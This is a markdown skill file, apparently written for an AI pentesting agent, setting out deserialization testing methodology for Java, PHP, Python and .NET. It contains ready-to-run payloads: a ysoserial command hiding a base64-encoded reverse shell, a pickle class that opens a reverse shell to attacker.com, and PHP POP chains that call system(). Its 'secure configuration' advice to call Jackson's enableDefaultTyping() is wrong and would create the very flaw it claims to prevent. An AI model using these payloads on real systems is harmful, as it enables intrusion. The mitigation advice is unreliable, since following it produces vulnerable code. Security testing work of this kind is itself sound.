---
name: deserialization-testing
description: Professional skills and methodology for deserialization vulnerability testing
version: 1.0.0
---

# Deserialization Vulnerability Testing

## Overview

Deserializing untrusted data can lead to remote code execution, denial of service, and other vulnerabilities. This skill covers detection, exploitation, and prevention.

## How the Vulnerability Works

When an application deserializes untrusted data into objects, an attacker may craft malicious serialized data that executes arbitrary code during deserialization.

## Common Formats

### Java

**Common libraries:**
- Native Java serialization
- Jackson
- Fastjson
- XStream
- Apache Commons Collections

### PHP

**Common functions:**
- unserialize()
- json_decode()

### Python

**Common modules:**
- pickle
- yaml
- json

### .NET

**Common classes:**
- BinaryFormatter
- SoapFormatter
- DataContractSerializer

## Testing Methods

### 1. Identify Serialized Data

**Java serialization signatures:**
```
AC ED 00 05 (hexadecimal)
rO0 (Base64)
```

**PHP serialization signatures:**
```
O:8:"stdClass"
a:2:{s:4:"test";s:4:"data";}
```

**Python pickle signatures:**
```
\x80\x03
```

### 2. Identify Deserialization Points

**Common locations:**
- Cookie values
- Session data
- API parameters
- File uploads
- Cached data
- Message queues

### 3. Java Deserialization

**Apache Commons Collections exploitation:**
```java
// Generate a payload with ysoserial
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
```

**Common gadget chains:**
- CommonsCollections1-7
- Spring1-2
- ROME
- Jdk7u21

### 4. PHP Deserialization

**Basic testing:**
```php
<?php
class Test {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}
echo serialize(new Test());
// O:4:"Test":1:{s:3:"cmd";s:2:"id";}
?>
```

**Exploiting magic methods:**
- __destruct()
- __wakeup()
- __toString()
- __call()

### 5. Python pickle

**Basic testing:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

pickle.dumps(RCE())
```

## Exploitation Techniques

### Java RCE

**Using ysoserial:**
```bash
# Generate a payload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin

# Base64 encoding
base64 -w 0 payload.bin
```

**Manual construction:**
```java
// Construct a malicious object using a gadget chain
// Refer to the ysoserial source
```

### PHP RCE

**Using POP chains:**
```php
<?php
class A {
    public $b;
    function __destruct() {
        $this->b->test();
    }
}

class B {
    public $c;
    function test() {
        call_user_func($this->c, "id");
    }
}

$a = new A();
$a->b = new B();
$a->b->c = "system";
echo serialize($a);
?>
```

### Python RCE

**Pickle RCE：**
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

## Bypass Techniques

### Encoding Bypass

**Base64 encoding:**
```
Original: rO0ABXNy...
Encoded: ck8wQUJYTnk...
```

**URL encoding:**
```
%72%4F%00%AB...
```

### Filter Bypass

**Use different gadget chains:**
- If CommonsCollections is filtered, try Spring
- If one version is filtered, try another

### Class Name Obfuscation

**Using reflection:**
```java
Class.forName("java.lang.Runtime").getMethod("exec", String.class)
```

## Tools

### ysoserial

```bash
# List available gadgets
java -jar ysoserial.jar

# Generate a payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin

# Generate Base64
java -jar ysoserial.jar CommonsCollections1 "command" | base64
```

### PHPGGC

```bash
# List available gadgets
./phpggc -l

# Generate a payload
./phpggc Monolog/RCE1 system id

# Generate an encoded payload
./phpggc -b Monolog/RCE1 system id
```

### Burp Suite

1. Intercept a request containing serialized data
2. Generate a payload using a plugin
3. Replace the original data
4. Observe the response

## Verification and Reporting

### Verification Steps

1. Confirm control over serialized data
2. Verify that deserialization triggers code execution
3. Assess impact (RCE, data disclosure, etc.)
4. Record the complete proof of concept
5. Record confirmed findings with `report_finding`, the platform's only entry point for findings. Include location, type, severity, reproduction steps/PoC, and remediation guidance

### Report Essentials

- Vulnerability location and serialized data format
- Gadget chain or exploitation method used
- Complete exploitation steps and PoC
- Remediation guidance (input validation, safe serialization, etc.)

## Mitigations

### Recommended Approach

1. **Avoid deserializing untrusted data**
   - Use JSON instead
   - Use safe serialization formats

2. **Input validation**
   ```java
   // Validate class names against an allowlist
   private static final Set<String> ALLOWED_CLASSES = 
       Set.of("com.example.SafeClass");
   
   private Object readObject(ObjectInputStream ois) {
       // Validate the class name
       // ...
   }
   ```

3. **Use secure configuration**
   ```java
   // Jackson configuration
   objectMapper.enableDefaultTyping();
   objectMapper.setVisibility(PropertyAccessor.FIELD, 
       JsonAutoDetect.Visibility.ANY);
   ```

4. **ClassLoader isolation**
   - Use a custom ClassLoader
   - Restrict loadable classes

5. **Monitoring and logging**
   - Log deserialization operations
   - Monitor anomalous behavior

## Considerations

- Test only in authorized environments
- Account for gadget-chain differences between library versions
- Consider payload size limits during testing
- Identify dependency versions in the target application